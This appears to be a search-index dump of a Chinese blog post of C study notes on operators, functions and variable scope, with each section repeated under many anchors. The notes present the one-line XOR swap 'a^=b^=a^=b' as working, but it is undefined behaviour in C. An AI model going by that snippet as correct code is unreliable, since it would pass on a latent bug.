逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#优先级"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#短路"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#条件运算符"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#嵌套条件表达式"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#逗号运算符"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#位运算"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include \u003cstdio.h\u003e //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include\u003cstdio.h\u003e int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#71函数"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#求和函数"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#什么是函数"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#调用函数"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#从函数中返回值"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#return的作用"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#没有返回值的函数"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include\u003cstdio.h\u003e int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include\u003cstdio.h\u003e void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#72函数的参数和变量"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#函数先后关系"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#函数原型"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#调用函数-1"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#传值"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 